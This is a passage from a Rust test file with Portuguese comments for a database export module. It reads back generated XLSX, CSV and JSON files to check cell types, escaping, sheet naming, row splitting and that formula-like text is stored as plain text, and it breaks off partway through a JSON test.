//! Testes da exportação e dos callbacks de progresso (E).
//! Cada saída é relida (o XML das planilhas de dentro do .xlsx, o CSV, o JSON, o .zip) e conferida.

use std::collections::{HashMap, HashSet};
use std::io::Read;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Instant;

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD;
use serde_json::{Value, json};

use super::*;

const GRANDE: i64 = 9_007_199_254_740_993; // 2^53 + 1: perde precisão em ponto flutuante
const NULO: Valor = Valor::Nulo;

// ---------------------------------------------------------------------------------------------------
// Apoio
// ---------------------------------------------------------------------------------------------------

/// Pasta temporária própria do teste, apagada no fim.
struct Pasta(PathBuf);

impl Pasta {
    fn nova(nome: &str) -> Pasta {
        static N: AtomicUsize = AtomicUsize::new(0);
        let caminho = std::env::temp_dir().join(format!(
            "exportar-teste-{nome}-{}-{}",
            std::process::id(),
            N.fetch_add(1, Ordering::Relaxed)
        ));
        let _ = fs::remove_dir_all(&caminho);
        fs::create_dir_all(&caminho).unwrap();
        Pasta(caminho)
    }

    fn join(&self, nome: &str) -> PathBuf {
        self.0.join(nome)
    }

    fn arquivos(&self) -> Vec<String> {
        let mut nomes: Vec<String> =
            fs::read_dir(&self.0).unwrap().map(|e| e.unwrap().file_name().to_string_lossy().into_owned()).collect();
        nomes.sort();
        nomes
    }

    fn sem_temporarios(&self) {
        let sobras: Vec<String> =
            self.arquivos().into_iter().filter(|n| n.starts_with('~') || n.ends_with(".tmp")).collect();
        assert!(sobras.is_empty(), "temporários esquecidos: {sobras:?}");
    }
}

impl Drop for Pasta {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn int(n: i64) -> Valor {
    Valor::Inteiro(n)
}

fn real(x: f64) -> Valor {
    Valor::Real(x)
}

fn txt(s: &str) -> Valor {
    Valor::Texto(s.to_string())
}

fn blob(d: &[u8]) -> Valor {
    Valor::Blob(d.to_vec())
}

fn cols(nomes: &[&str]) -> Vec<String> {
    nomes.iter().map(|s| s.to_string()).collect()
}

fn ok(linhas: Vec<Vec<Valor>>) -> Vec<Resultado<Vec<Valor>>> {
    linhas.into_iter().map(Ok).collect()
}

fn exportar(colunas: &[&str], linhas: Vec<Vec<Valor>>, formato: Formato, destino: &Path) -> Resumo {
    exportar_com(colunas, linhas, formato, destino, &Opcoes::default()).unwrap()
}

fn exportar_com(
    colunas: &[&str],
    linhas: Vec<Vec<Valor>>,
    formato: Formato,
    destino: &Path,
    opcoes: &Opcoes,
) -> Resultado<Resumo> {
    exportar_linhas(&cols(colunas), ok(linhas), formato, destino, opcoes, "dados", Acompanhamento::default())
}

/// Os limites diminuídos.
fn exportar_limitado(
    colunas: &[&str],
    linhas: Vec<Vec<Valor>>,
    destino: &Path,
    nome: &str,
    limites: Limites,
) -> Resumo {
    let escritor = Escritor::novo(Formato::Xlsx, destino, &Opcoes::default(), false, None, Acompanhamento::default())
        .unwrap()
        .com_limites(limites);
    gravar_fonte_unica(escritor, nome, &cols(colunas), ok(linhas)).unwrap()
}

fn limites(amostra: usize, linhas: u64) -> Limites {
    Limites { amostra_largura: amostra, linhas_excel: linhas, ..Limites::default() }
}

/// Limites padrão, com os arquivos de trabalho (o CSV de cada tabela do .zip) numa pasta do próprio teste: é
/// nada sobra fora da pasta do destino. Conferir o %TEMP% inteiro daria corrida, porque os testes rodam em paralelo.
fn trabalho_em(pasta: &Pasta) -> Limites {
    Limites { pasta_trabalho: Some(pasta.0.clone()), ..Limites::default() }
}

fn conteudo_da_pasta(pasta: &Path) -> Vec<String> {
    let mut nomes: Vec<String> =
        fs::read_dir(pasta).unwrap().map(|e| e.unwrap().file_name().to_string_lossy().into_owned()).collect();
    nomes.sort();
    nomes
}

/// Espera a pasta ficar vazia (um antivírus pode segurar o arquivo apagado por um instante) e confere.
fn esperar_vazia(pasta: &Path) {
    let inicio = Instant::now();
    while !conteudo_da_pasta(pasta).is_empty() && inicio.elapsed().as_secs() < 5 {
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
    assert_eq!(conteudo_da_pasta(pasta), Vec::<String>::new(), "arquivos de trabalho esquecidos");
}

/// Uma fonte escrita no teste: nome, colunas e linhas.
type FonteTeste<'a> = (&'a str, &'a [&'a str], Vec<Vec<Valor>>);
/// A mesma fonte pronta para `exportar_varias`.
type FontePronta = (String, Vec<String>, Vec<Resultado<Vec<Valor>>>);

fn fontes(lista: Vec<FonteTeste<'_>>) -> Vec<FontePronta> {
    lista.into_iter().map(|(n, c, l)| (n.to_string(), cols(c), ok(l))).collect()
}

fn varias(lista: Vec<FonteTeste<'_>>, formato: Formato, destino: &Path) -> Resultado<Resumo> {
    exportar_varias(fontes(lista), formato, destino, &Opcoes::default(), None, Acompanhamento::default())
}

// ---- .zip / .xlsx ---------------------------------------------------------------------------------

fn abrir_zip(caminho: &Path) -> zip::ZipArchive<fs::File> {
    zip::ZipArchive::new(fs::File::open(caminho).unwrap()).unwrap()
}

fn parte_bytes(caminho: &Path, nome: &str) -> Vec<u8> {
    let mut pacote = abrir_zip(caminho);
    let mut arquivo = pacote.by_name(nome).unwrap();
    let mut dados = Vec::new();
    arquivo.read_to_end(&mut dados).unwrap();
    dados
}

fn parte(caminho: &Path, nome: &str) -> String {
    String::from_utf8(parte_bytes(caminho, nome)).unwrap()
}

fn nomes_no_zip(caminho: &Path) -> Vec<String> {
    let mut pacote = abrir_zip(caminho);
    (0..pacote.len()).map(|i| pacote.by_index(i).unwrap().name().to_string()).collect()
}

fn xml_da_planilha(caminho: &Path, indice: usize) -> String {
    parte(caminho, &format!("xl/worksheets/sheet{indice}.xml"))
}

fn desescapar(s: &str) -> String {
    s.replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&#13;", "\r").replace("&amp;", "&")
}

fn atributo(tag: &str, nome: &str) -> Option<String> {
    let chave = format!(" {nome}=\"");
    let inicio = tag.find(&chave)? + chave.len();
    let fim = tag[inicio..].find('"')? + inicio;
    Some(desescapar(&tag[inicio..fim]))
}

fn nomes_das_planilhas(caminho: &Path) -> Vec<String> {
    let xml = parte(caminho, "xl/workbook.xml");
    xml.split("<sheet ").skip(1).map(|s| atributo(&format!(" {s}"), "name").unwrap()).collect()
}

#[derive(Debug, Clone, PartialEq)]
struct Cel {
    tipo: Option<String>,
    estilo: Option<String>,
    valor: String,
}

/// As células de uma planilha, na ordem do XML: referência → tipo, estilo e valor (texto desescapado).
fn celulas(xml: &str) -> Vec<(String, Cel)> {
    let mut saida = Vec::new();
    let mut resto = xml;
    while let Some(p) = resto.find("<c r=\"") {
        resto = &resto[p..];
        let fim_tag = resto.find('>').unwrap();
        let tag = &resto[..fim_tag];
        let referencia = atributo(tag, "r").unwrap();
        let tipo = atributo(tag, "t");
        let estilo = atributo(tag, "s");
        let (valor, avanco) = if tag.ends_with('/') {
            (String::new(), fim_tag + 1)
        } else {
            let fecha = resto.find("</c>").unwrap();
            let dentro = &resto[fim_tag + 1..fecha];
            let valor = if let Some(v) = dentro.strip_prefix("<v>") {
                v.trim_end_matches("</v>").to_string()
            } else if let Some(p) = dentro.find("<t") {
                let abre = p + dentro[p..].find('>').unwrap() + 1;
                desescapar(&dentro[abre..dentro.find("</t>").unwrap()])
            } else {
                String::new()
            };
            (valor, fecha + 4)
        };
        saida.push((referencia, Cel { tipo, estilo, valor }));
        resto = &resto[avanco..];
    }
    saida
}

fn mapa(xml: &str) -> HashMap<String, Cel> {
    celulas(xml).into_iter().collect()
}

fn valor_de(m: &HashMap<String, Cel>, referencia: &str) -> Option<String> {
    m.get(referencia).map(|c| c.valor.clone())
}

fn texto_de(m: &HashMap<String, Cel>, referencia: &str) -> String {
    let c = m.get(referencia).unwrap_or_else(|| panic!("sem a célula {referencia}"));
    assert_eq!(c.tipo.as_deref(), Some("inlineStr"), "{referencia} devia ser texto");
    c.valor.clone()
}

fn numero_de(m: &HashMap<String, Cel>, referencia: &str) -> String {
    let c = m.get(referencia).unwrap_or_else(|| panic!("sem a célula {referencia}"));
    assert_eq!(c.tipo, None, "{referencia} devia ser número");
    c.valor.clone()
}

// ---- CSV / JSON -----------------------------------------------------------------------------------

/// Leitor de CSV (aspas, aspas dobradas, quebras dentro de aspas).
fn ler_csv_texto(texto: &str, separador: char) -> Vec<Vec<String>> {
    let mut registros = Vec::new();
    let mut registro = Vec::new();
    let mut campo = String::new();
    let mut aspas = false;
    let mut pendente = false;
    let mut chars = texto.chars().peekable();
    while let Some(c) = chars.next() {
        if aspas {
            if c == '"' {
                if chars.peek() == Some(&'"') {
                    chars.next();
                    campo.push('"');
                } else {
                    aspas = false;
                }
            } else {
                campo.push(c);
            }
        } else if c == '"' {
            aspas = true;
            pendente = true;
        } else if c == separador {
            registro.push(std::mem::take(&mut campo));
            pendente = true;
        } else if c == '\r' || c == '\n' {
            if c == '\r' && chars.peek() == Some(&'\n') {
                chars.next();
            }
            registro.push(std::mem::take(&mut campo));
            registros.push(std::mem::take(&mut registro));
            pendente = false;
        } else {
            campo.push(c);
            pendente = true;
        }
    }
    if pendente {
        registro.push(campo);
        registros.push(registro);
    }
    registros
}

fn sem_bom(bruto: &[u8]) -> String {
    assert!(bruto.starts_with(b"\xef\xbb\xbf"), "sem BOM");
    String::from_utf8(bruto[3..].to_vec()).unwrap()
}

fn ler_csv(caminho: &Path, separador: char) -> Vec<Vec<String>> {
    ler_csv_texto(&sem_bom(&fs::read(caminho).unwrap()), separador)
}

fn ler_json(caminho: &Path) -> Value {
    serde_json::from_slice(&fs::read(caminho).unwrap()).unwrap()
}

fn linhas_numeradas(n: u64) -> Vec<Vec<Valor>> {
    (0..n).map(|k| vec![int(k as i64), txt(&format!("linha {k}"))]).collect()
}

/// `falha_no_meio`: n linhas boas e depois o erro.
fn falha_no_meio(n_antes: u64, erro: ErroBanco) -> Vec<Resultado<Vec<Valor>>> {
    let mut linhas = ok(linhas_numeradas(n_antes));
    linhas.push(Err(erro));
    linhas
}

fn falha_simulada() -> ErroBanco {
    ErroBanco::novo("Falha simulada no meio da leitura.")
}

/// Como o `traduzir_sqlite` devolve "database is locked".
fn banco_travado() -> ErroBanco {
    ErroBanco::com_status("O banco está em uso por outro programa. Feche-o lá e tente de novo.", 409)
        .detalhe("database is locked")
}

// ---------------------------------------------------------------------------------------------------
// Excel
// ---------------------------------------------------------------------------------------------------

const COLUNAS_VARIADAS: [&str; 13] = [
    "id", "nome", "formula", "grande", "quinze", "foto", "nulo", "preco", "infinito", "controle", "longo", "erro",
    "vazio",
];

fn linhas_variadas() -> Vec<Vec<Valor>> {
    vec![
        vec![
            int(1),
            txt("Ana Brandão"),
            txt("=SOMA(A1)"),
            int(GRANDE),
            int(123_456_789_012_345),
            blob(b"\x00\x01binario\xff"),
            NULO,
            real(3.25),
            real(f64::INFINITY),
            txt("a\x01b\x0bc"),
            txt(&"x".repeat(40_000)),
            txt("#N/A"),
            txt(""),
        ],
        vec![
            int(2),
            txt("Íris Nogueira"),
            txt("="),
            int(-GRANDE),
            int(-123_456_789_012_345),
            blob(b""),
            NULO,
            real(-0.5),
            real(f64::NEG_INFINITY),
            txt("sem controle"),
            txt("curto"),
            txt("#x"),
            NULO,
        ],
    ]
}

#[test]
fn excel_estilo_do_cabecalho_congelamento_e_filtro() {
    let pasta = Pasta::nova("estilo");
    let destino = pasta.join("clientes.xlsx");
    let resumo = exportar_linhas(
        &cols(&COLUNAS_VARIADAS),
        ok(linhas_variadas()),
        Formato::Xlsx,
        &destino,
        &Opcoes::default(),
        "clientes",
        Acompanhamento::default(),
    )
    .unwrap();

    assert_eq!((resumo.linhas, resumo.tabelas, resumo.formato), (2, 1, Formato::Xlsx));
    assert_eq!(resumo.caminho, destino);
    assert_eq!(resumo.bytes, fs::metadata(&destino).unwrap().len());
    assert_eq!(resumo.nome(), "clientes.xlsx");
    assert_eq!(nomes_das_planilhas(&destino), ["clientes"]);
    let xml = xml_da_planilha(&destino, 1);
    assert!(xml.contains("<pane ySplit=\"1\" topLeftCell=\"A2\" activePane=\"bottomLeft\" state=\"frozen\"/>"));
    assert!(xml.contains("<autoFilter ref=\"A1:M3\"/>"));
    let cabecalho: Vec<(String, Cel)> =
        celulas(&xml).into_iter().filter(|(r, _)| r.ends_with('1') && r.len() == 2).collect();
    assert_eq!(cabecalho.iter().map(|(_, c)| c.valor.as_str()).collect::<Vec<_>>(), COLUNAS_VARIADAS);
    for (referencia, celula) in &cabecalho {
        assert_eq!(celula.estilo.as_deref(), Some("1"), "{referencia}");
        assert_eq!(celula.tipo.as_deref(), Some("inlineStr"), "{referencia}");
    }
    assert_eq!(mapa(&xml)["A2"].estilo, None); // só o cabeçalho é estilizado
    let estilos = parte(&destino, "xl/styles.xml");
    assert!(estilos.contains("<font><b/><sz val=\"11\"/><color rgb=\"FFFFFFFF\"/>"));
    assert!(estilos.contains("<patternFill patternType=\"solid\"><fgColor rgb=\"FF133C63\"/>"));
    assert!(estilos.contains(
        "<xf numFmtId=\"0\" fontId=\"1\" fillId=\"2\" borderId=\"0\" xfId=\"0\" applyFont=\"1\" applyFill=\"1\"/>"
    ));
    let livro = parte(&destino, "xl/workbook.xml");
    assert!(livro.contains(
        "<definedName name=\"_xlnm._FilterDatabase\" localSheetId=\"0\" hidden=\"1\">'clientes'!$A$1:$M$3</definedName>"
    ));
    assert!(parte(&destino, "docProps/core.xml").contains("<dc:creator>DataBox</dc:creator>"));
}

#[test]
fn excel_tipos_das_celulas() {
    let pasta = Pasta::nova("tipos");
    let destino = pasta.join("tipos.xlsx");
    exportar(&COLUNAS_VARIADAS, linhas_variadas(), Formato::Xlsx, &destino);
    let m = mapa(&xml_da_planilha(&destino, 1));

    assert_eq!(numero_de(&m, "A2"), "1");
    assert_eq!(texto_de(&m, "B2"), "Ana Brandão");
    assert_eq!(texto_de(&m, "B3"), "Íris Nogueira");
    assert_eq!(texto_de(&m, "C2"), "=SOMA(A1)");
    assert_eq!(texto_de(&m, "C3"), "=");
    assert_eq!(texto_de(&m, "D2"), "9007199254740993");
    assert_eq!(texto_de(&m, "D3"), "-9007199254740993");
    assert_eq!(numero_de(&m, "E2"), "123456789012345");
    assert_eq!(numero_de(&m, "E3"), "-123456789012345");
    assert_eq!(STANDARD.decode(texto_de(&m, "F2")).unwrap(), b"\x00\x01binario\xff");
    assert_eq!(valor_de(&m, "F3"), None);
    assert_eq!(valor_de(&m, "G2"), None);
    assert_eq!(numero_de(&m, "H2"), "3.25");
    assert_eq!(numero_de(&m, "H3"), "-0.5");
    assert_eq!(texto_de(&m, "I2"), "Infinity");
    assert_eq!(texto_de(&m, "I3"), "-Infinity");
    assert_eq!(texto_de(&m, "J2"), "abc");
    assert_eq!(texto_de(&m, "K2").chars().count(), 32_767);
    assert_eq!(texto_de(&m, "L2"), "#N/A");
    assert_eq!(texto_de(&m, "L3"), "#x");
    assert_eq!(valor_de(&m, "M2"), None);
    assert_eq!(valor_de(&m, "M3"), None);
}

#[test]
fn excel_nunca_grava_formula() {
    let pasta = Pasta::nova("formula");
    let destino = pasta.join("formula.xlsx");
    exportar(
        &["=cabeçalho", "texto"],
        vec![vec![txt("=SOMA(A1)"), txt("=1+1")], vec![txt("=HYPERLINK(\"x\")"), txt("#REF!")]],
        Formato::Xlsx,
        &destino,
    );
    let xml = xml_da_planilha(&destino, 1);
    assert!(!xml.contains("<f>") && !xml.contains("<f "));
    let valores: Vec<(String, Option<String>)> = celulas(&xml).into_iter().map(|(_, c)| (c.valor, c.tipo)).collect();
    let s = |v: &str| (v.to_string(), Some("inlineStr".to_string()));
    assert_eq!(valores, [s("=cabeçalho"), s("texto"), s("=SOMA(A1)"), s("=1+1"), s("=HYPERLINK(\"x\")"), s("#REF!")]);
}

#[test]
fn excel_remove_caracteres_que_o_xml_nao_aceita() {
    let pasta = Pasta::nova("xml");
    let destino = pasta.join("xml.xlsx");
    // (o Rust não tem metade de par substituto num texto)
    let texto = "a\u{fffe}b\u{ffff}c\u{1f}d\ttab\nquebra";
    exportar(&["col\u{2}"], vec![vec![txt(texto)]], Formato::Xlsx, &destino);
    let m = mapa(&xml_da_planilha(&destino, 1));
    assert_eq!(texto_de(&m, "A1"), "col");
    assert_eq!(texto_de(&m, "A2"), "abcd\ttab\nquebra");
}

#[test]
fn excel_escapa_o_xml_e_preserva_o_texto() {
    let pasta = Pasta::nova("escape");
    let destino = pasta.join("escape.xlsx");
    exportar(
        &["a&b<c>"],
        vec![vec![txt(" com espaço ")], vec![txt("cr\r\nlf")], vec![txt("_x0041_ e _x00_")], vec![txt("<&>\"'")]],
        Formato::Xlsx,
        &destino,
    );
    let xml = xml_da_planilha(&destino, 1);
    assert!(xml.contains("<t>a&amp;b&lt;c&gt;</t>"));
    assert!(xml.contains("<t xml:space=\"preserve\"> com espaço </t>"));
    assert!(xml.contains("<t>cr&#13;\nlf</t>")); // o CR cru viraria LF ao ler o XML
    assert!(xml.contains("<t>_x005F_x0041_ e _x00_</t>")); // senão o Excel mostraria "A"
    assert!(xml.contains("<t>&lt;&amp;&gt;\"'</t>"));
    assert_eq!(xlsx::escapar_para_teste("_x00FF_"), "_x005F_x00FF_");
}

#[test]
fn excel_larguras_pela_amostra() {
    let pasta = Pasta::nova("larguras");
    let destino = pasta.join("larguras.xlsx");
    let repetida = vec![int(1), txt("abc"), txt(&"x".repeat(200)), txt(&format!("linha curta\n{}", "y".repeat(30)))];
    let mut linhas = vec![repetida.clone(), repetida.clone(), repetida];
    linhas.push(vec![int(2), txt(&"z".repeat(50)), txt("w"), txt("v")]);
    exportar_limitado(
        &["id", "curta", "enorme", "multilinha"],
        linhas,
        &destino,
        "dados",
        limites(3, LIMITE_LINHAS_EXCEL),
    );
    let xml = xml_da_planilha(&destino, 1);
    let largura = |n: usize| -> String {
        let tag = format!("<col min=\"{n}\" max=\"{n}\" width=\"");
        let resto = &xml[xml.find(&tag).unwrap() + tag.len()..];
        resto[..resto.find('"').unwrap()].to_string()
    };
    assert_eq!(largura(1), "8"); // mínimo
    assert_eq!(largura(2), "8"); // a linha 4 ("z" * 50) ficou fora da amostra
    assert_eq!(largura(3), "60"); // máximo
    assert_eq!(largura(4), "32"); // a linha mais longa do texto + 2
    assert_eq!(xml.matches("<row ").count(), 5);
}

#[test]
fn excel_continua_em_nova_planilha() {
    let pasta = Pasta::nova("continua");
    let destino = pasta.join("eventos.xlsx");
    let linhas: Vec<Vec<Valor>> = (0..12).map(|i| vec![int(i), txt(&format!("evento {i}"))]).collect();
    let resumo = exportar_limitado(&["n", "texto"], linhas, &destino, "eventos", limites(AMOSTRA_LARGURA, 5));
    assert_eq!(resumo.linhas, 12);
    assert_eq!(nomes_das_planilhas(&destino), ["eventos", "eventos (2)", "eventos (3)"]);
    let mut lidas = Vec::new();
    for (indice, esperadas) in [(1usize, 5u64), (2, 5), (3, 2)] {
        let xml = xml_da_planilha(&destino, indice);
        let m = mapa(&xml);
        assert_eq!((texto_de(&m, "A1"), texto_de(&m, "B1")), ("n".to_string(), "texto".to_string()));
        assert_eq!(m["A1"].estilo.as_deref(), Some("1"));
        assert!(xml.contains("state=\"frozen\""));
        assert!(xml.contains(&format!("<autoFilter ref=\"A1:B{}\"/>", esperadas + 1)));
        assert_eq!(xml.matches("<row ").count() as u64, esperadas + 1);
        for linha in 2..=esperadas + 1 {
            lidas.push(numero_de(&m, &format!("A{linha}")).parse::<i64>().unwrap());
        }
    }
    assert_eq!(lidas, (0..12).collect::<Vec<i64>>());
    let livro = parte(&destino, "xl/workbook.xml");
    assert!(livro.contains("localSheetId=\"2\" hidden=\"1\">'eventos (3)'!$A$1:$B$3</definedName>"));
}

#[test]
fn excel_continuacao_respeita_31_caracteres() {
    let pasta = Pasta::nova("longo");
    let destino = pasta.join("longo.xlsx");
    let linhas: Vec<Vec<Valor>> = (0..5).map(|i| vec![int(i)]).collect();
    exportar_limitado(&["n"], linhas, &destino, &"n".repeat(40), limites(AMOSTRA_LARGURA, 2));
    let n27 = "n".repeat(27);
    assert_eq!(nomes_das_planilhas(&destino), ["n".repeat(31), format!("{n27} (2)"), format!("{n27} (3)")]);
}

#[test]
fn excel_limite_exato_nao_cria_planilha_vazia() {
    let pasta = Pasta::nova("exato");
    let destino = pasta.join("exato.xlsx");
    let linhas: Vec<Vec<Valor>> = (0..4).map(|i| vec![int(i)]).collect();
    exportar_limitado(&["n"], linhas, &destino, "dados", limites(AMOSTRA_LARGURA, 4));
    assert_eq!(nomes_das_planilhas(&destino), ["dados"]);
}

#[test]
fn excel_sem_linhas_tem_cabecalho_e_filtro() {
    let pasta = Pasta::nova("vazio");
    let destino = pasta.join("vazio.xlsx");
    let resumo = exportar(&["a", "b"], vec![], Formato::Xlsx, &destino);
    assert_eq!(resumo.linhas, 0);
    let xml = xml_da_planilha(&destino, 1);
    let valores: Vec<String> = celulas(&xml).into_iter().map(|(_, c)| c.valor).collect();
    assert_eq!(valores, ["a", "b"]);
    assert_eq!(xml.matches("<row ").count(), 1);
    assert!(xml.contains("<autoFilter ref=\"A1:B1\"/>"));
}

#[test]
fn nome_planilha_saneia_e_evita_repeticao() {
    let mut usados = HashSet::new();
    assert_eq!(nome_planilha("clientes", &mut usados), "clientes");
    assert_eq!(nome_planilha("Clientes", &mut usados), "Clientes (2)");
    assert_eq!(nome_planilha("CLIENTES", &mut usados), "CLIENTES (3)");
    assert_eq!(usados, HashSet::from(["clientes".to_string(), "Clientes (2)".to_string(), "CLIENTES (3)".to_string()]));

    let novo = |nome: &str| nome_planilha(nome, &mut HashSet::new());
    assert_eq!(novo("a[b]:c*d?e/f\\g"), "a_b__c_d_e_f_g");
    assert_eq!(novo("'citada'"), "citada");
    assert_eq!(novo("' 'dentro' '"), "dentro");
    assert_eq!(novo("meio'apóstrofo"), "meio'apóstrofo");
    assert_eq!(novo("linha\nnova\tcom tab"), "linha nova com tab");
    assert_eq!(novo("con\u{1}trole"), "controle");
    for vazio in ["", "   ", "''"] {
        assert_eq!(novo(vazio), "Planilha");
    }
    assert_eq!(novo("History"), "History (2)");

    let mut longos = HashSet::new();
    let primeiro = nome_planilha("relatório de vendas por região e mês", &mut longos);
    let segundo = nome_planilha("relatório de vendas por região e mês", &mut longos);
    assert_eq!(primeiro, "relatório de vendas por região".chars().take(31).collect::<String>());
    assert!(primeiro.chars().count() <= 31 && segundo.chars().count() <= 31);
    assert!(segundo.ends_with(" (2)") && segundo.to_lowercase() != primeiro.to_lowercase());

    // o corte nos 31 não pode deixar apóstrofo nem espaço na ponta
    assert_eq!(novo(&format!("{}'b", "a".repeat(30))), "a".repeat(30));
    assert_eq!(novo(&format!("{} 'b", "a".repeat(29))), "a".repeat(29));
}

#[test]
fn excel_varias_planilhas_com_nomes_problematicos() {
    let pasta = Pasta::nova("nomes");
    let destino = pasta.join("banco.xlsx");
    let x40 = "x".repeat(40);
    let lista: Vec<FonteTeste<'_>> = vec![
        ("clientes", &["a"], vec![vec![int(1)]]),
        ("CLIENTES", &["a"], vec![vec![int(2)]]),
        ("a/b:c", &["a"], vec![vec![int(3)]]),
        (x40.as_str(), &["a"], vec![vec![int(4)]]),
        (x40.as_str(), &["a"], vec![vec![int(5)]]),
    ];
    let resumo = varias(lista, Formato::Xlsx, &destino).unwrap();
    assert_eq!((resumo.tabelas, resumo.linhas), (5, 5));
    let x27 = "x".repeat(27);
    assert_eq!(
        nomes_das_planilhas(&destino),
        ["clientes".to_string(), "CLIENTES (2)".into(), "a_b_c".into(), "x".repeat(31), format!("{x27} (2)")]
    );
    let primeiras: Vec<String> = (1..=5).map(|i| numero_de(&mapa(&xml_da_planilha(&destino, i)), "A2")).collect();
    assert_eq!(primeiras, ["1", "2", "3", "4", "5"]);
}

#[test]
fn excel_sem_fontes_gera_arquivo_valido() {
    let pasta = Pasta::nova("nada");
    let destino = pasta.join("nada.xlsx");
    let resumo = varias(vec![], Formato::Xlsx, &destino).unwrap();
    assert_eq!((resumo.tabelas, resumo.linhas), (0, 0));
    assert_eq!(nomes_das_planilhas(&destino), ["Planilha"]);
    let nomes = nomes_no_zip(&destino);
    for parte in ["[Content_Types].xml", "_rels/.rels", "xl/workbook.xml", "xl/styles.xml", "xl/worksheets/sheet1.xml"]
    {
        assert!(nomes.iter().any(|n| n == parte), "falta {parte}");
    }
}

// ---------------------------------------------------------------------------------------------------
// CSV
// ---------------------------------------------------------------------------------------------------

const COLUNAS_CSV: [&str; 11] = [
    "inteiro",
    "real",
    "texto_numero",
    "real_inteiro",
    "nulo",
    "blob",
    "infinito",
    "grande",
    "aspas",
    "quebra",
    "separadores",
];

fn linha_csv() -> Vec<Valor> {
    vec![
        int(10),
        real(3.5),
        txt("1.5"),
        real(2.0),
        NULO,
        blob(b"\x01\x02"),
        real(f64::NEG_INFINITY),
        int(GRANDE),
        txt("com \"aspas\""),
        txt("linha 1\nlinha 2"),
        txt("a;b,c\td"),
    ]
}

#[test]
fn csv_separadores_bom_e_quebras() {
    for separador in [';', ',', '\t'] {
        let pasta = Pasta::nova("separadores");
        let destino = pasta.join("saida.csv");
        let segunda =
            vec![int(1), real(0.25), txt("x"), real(-1.0), NULO, NULO, NULO, int(0), txt(""), txt(""), txt("")];
        let opcoes = Opcoes { csv_separador: separador, ..Opcoes::default() };
        let resumo = exportar_com(&COLUNAS_CSV, vec![linha_csv(), segunda], Formato::Csv, &destino, &opcoes).unwrap();
        let bruto = fs::read(&destino).unwrap();
        let texto = sem_bom(&bruto);
        assert_eq!(texto.matches("\r\n").count(), 3); // cabeçalho + 2 linhas; a quebra dentro do valor é só "\n"
        assert!(texto.ends_with("\r\n"));
        assert!(texto.starts_with(&format!("{}\r\n", COLUNAS_CSV.join(separador.to_string().as_str()))));
        let linhas = ler_csv(&destino, separador);
        assert_eq!((resumo.linhas, resumo.formato, resumo.bytes), (2, Formato::Csv, bruto.len() as u64));
        assert_eq!(linhas[0], COLUNAS_CSV);
        assert_eq!(
            linhas[1],
            [
                "10",
                "3,5",
                "1.5",
                "2,0",
                "",
                "AQI=",
                "-Infinity",
                "9007199254740993",
                "com \"aspas\"",
                "linha 1\nlinha 2",
                "a;b,c\td"
            ]
        );
        assert_eq!(linhas[2], ["1", "0,25", "x", "-1,0", "", "", "", "0", "", "", ""]);
    }
}

#[test]
fn csv_decimal_ponto() {
    let pasta = Pasta::nova("ponto");
    let destino = pasta.join("ponto.csv");
    let opcoes = Opcoes { csv_decimal: '.', ..Opcoes::default() };
    exportar_com(
        &["i", "r", "t"],
        vec![vec![int(10), real(3.5), txt("3,5")], vec![int(7), real(f64::INFINITY), txt("x")]],
        Formato::Csv,
        &destino,
        &opcoes,
    )
    .unwrap();
    assert_eq!(ler_csv(&destino, ';')[1..], [["10", "3.5", "3,5"], ["7", "Infinity", "x"]]);
}

#[test]
fn csv_decimal_virgula_so_em_real() {
    let pasta = Pasta::nova("virgula");
    let destino = pasta.join("virgula.csv");
    exportar_com(
        &["i", "r", "t"],
        vec![vec![int(1000), real(1234.5), txt("1234.5")], vec![int(-3), real(1e-07), txt("v1.2")]],
        Formato::Csv,
        &destino,
        &Opcoes { csv_decimal: ',', ..Opcoes::default() },
    )
    .unwrap();
    assert_eq!(ler_csv(&destino, ';')[1..], [["1000", "1234,5", "1234.5"], ["-3", "1e-07", "v1.2"]]);
}

#[test]
fn csv_sem_cabecalho_e_acentos() {
    let pasta = Pasta::nova("sem_cabecalho");
    let destino = pasta.join("sem_cabecalho.csv");
    exportar_com(
        &["nome", "cidade"],
        vec![vec![txt("Fábio Guimarães"), txt("São Paulo")]],
        Formato::Csv,
        &destino,
        &Opcoes { cabecalho: false, ..Opcoes::default() },
    )
    .unwrap();
    assert_eq!(ler_csv(&destino, ';'), [["Fábio Guimarães", "São Paulo"]]);
    let bruto = fs::read(&destino).unwrap();
    assert!(bruto.windows("São Paulo".len()).any(|w| w == "São Paulo".as_bytes()));
}

#[test]
fn opcoes_como_dicionario_e_tab_por_extenso() {
    // o texto das preferências passa por separador_csv / decimal_csv
    let pasta = Pasta::nova("tab");
    let destino = pasta.join("tab.csv");
    let opcoes = Opcoes {
        csv_separador: separador_csv("tab").unwrap(),
        csv_decimal: decimal_csv(",").unwrap(),
        ..Opcoes::default()
    };
    exportar_com(&["a", "b"], vec![vec![int(1), real(2.5)]], Formato::Csv, &destino, &opcoes).unwrap();
    assert_eq!(sem_bom(&fs::read(&destino).unwrap()), "a\tb\r\n1\t2,5\r\n");
    assert_eq!(separador_csv("\\t").unwrap(), '\t');
    assert_eq!(separador_csv(";").unwrap(), ';');
    assert_eq!(decimal_csv(".").unwrap(), '.');
    let erro = separador_csv("|").unwrap_err();
    assert_eq!(erro.mensagem, "Separador de CSV inválido. Use ponto e vírgula, vírgula ou tabulação.");
    assert_eq!(erro.detalhe.as_deref(), Some("'|'"));
    assert_eq!(decimal_csv(";").unwrap_err().mensagem, "Separador decimal inválido. Use vírgula ou ponto.");
}

// ---------------------------------------------------------------------------------------------------
// JSON
// ---------------------------------------------------------------------------------------------------

#[test]
fn json_valores() {
    let pasta = Pasta::nova("json");
    let destino = pasta.join("saida.json");
    let colunas = ["id", "nome", "grande", "foto", "nulo", "preco", "mais", "menos", "aspas", "quebra"];
    let linhas = vec![vec![
        int(1),
        txt("Ana Brandão"),
        int(GRANDE),
        blob(b"\x00\xffdados"),
        NULO,
        real(3.25),
        real(f64::INFINITY),
        real(f64::NEG_INFINITY),
        txt("com \"aspas\""),
        txt("a\nb"),
    ]];
    let resumo = exportar(&colunas, linhas, Formato::Json, &destino);
    let bruto = fs::read(&destino).unwrap();
    let texto = String::from_utf8(bruto.clone()).unwrap();
    assert!(!bruto.starts_with(b"\xef\xbb\xbf"));
    assert!(texto.contains("Ana Brandão") && !texto.contains("\\u00e3"));
    assert!(texto.contains("9007199254740993"));
